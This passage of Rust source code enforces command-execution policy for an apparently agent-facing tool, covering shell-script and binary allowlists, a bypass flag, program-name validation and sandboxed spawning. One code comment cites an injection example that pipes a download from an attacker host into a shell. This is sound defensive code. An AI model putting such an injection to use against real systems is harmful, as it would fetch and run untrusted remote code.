                "'shell_script' is mutually exclusive with 'program' / 'args'".into(),
            ));
        }
        // Empty `allowed_shell_scripts` means "all shell scripts
        // allowed" once `allow_shell == true` has been granted, to
        // match the documented empty-allowlist convention shared
        // with `command_allowlist` and `binary_allowlist`. A
        // non-empty list switches back to strict verbatim-match
        // enforcement so operators who pin specific scripts keep
        // the original behavior.
        if !ctx.config.command.bypass_allowlists
            && !ctx.config.command.allowed_shell_scripts.is_empty()
            && !ctx
                .config
                .command
                .allowed_shell_scripts
                .iter()
                .any(|s| s == script)
        {
            return Err(ToolError::Forbidden(
                "shell_script not present in ToolConfig::command.allowed_shell_scripts; \
                 operator must opt in by listing the script verbatim"
                    .into(),
            ));
        }
        check_command_allowlist(
            script,
            ctx.config.command.bypass_allowlists,
            &ctx.config.command.command_allowlist,
        )?;
        if let Some(first) = script.split_whitespace().next() {
            check_binary_allowlist(
                first,
                ctx.config.command.enabled,
                ctx.config.command.bypass_allowlists,
                &ctx.config.command.binary_allowlist,
            )?;
        }
        return Ok(());
    }

    let program = args.program.as_deref().ok_or_else(|| {
        ToolError::InvalidArguments(
            "missing 'program' argument; use 'shell_script' for shell commands".into(),
        )
    })?;

    // Validate the raw string BEFORE the allow-list checks so that
    // injection attempts (`"ls; curl attacker | sh"`) surface as
    // `InvalidArguments` rather than a downstream `which` failure
    // masquerading as `Forbidden`.
    validate_program_name(program)?;

    check_command_allowlist(
        program,
        ctx.config.command.bypass_allowlists,
        &ctx.config.command.command_allowlist,
    )?;
    check_binary_allowlist(
        program,
        ctx.config.command.enabled,
        ctx.config.command.bypass_allowlists,
        &ctx.config.command.binary_allowlist,
    )?;

    Ok(())
}

/// Spawn the actual process via `spawn_blocking_tool`, dispatching to
/// either the shell-script or direct-execution path.
///
/// Precondition: `enforce_command_policy(&args, ctx)` returned `Ok`.
/// The defensive `ok_or_else` for `program` covers a future refactor
/// that forgets to call the policy helper; it surfaces the same
/// `InvalidArguments` message as the policy gate would.
async fn execute_run_command(args: RunArgs, ctx: &ToolContext) -> Result<ToolResult, ToolError> {
    let RunArgs {
        cwd,
        timeout_ms,
        shell_script,
        program,
        cmd_args,
        ..
    } = args;

    let sandbox = ctx.sandbox.clone();

    if let Some(script) = shell_script {
        return super::spawn_blocking_tool(move || {
            cmd_run_shell_script(&sandbox, &script, cwd.as_deref(), timeout_ms)
        })
        .await;
    }

    let program = program.ok_or_else(|| {
        ToolError::InvalidArguments(
            "missing 'program' argument; use 'shell_script' for shell commands".into(),
        )
    })?;

    super::spawn_blocking_tool(move || {
        cmd_run(&sandbox, &program, &cmd_args, cwd.as_deref(), timeout_ms)
    })
    .await
}

#[cfg(test)]
mod tests;
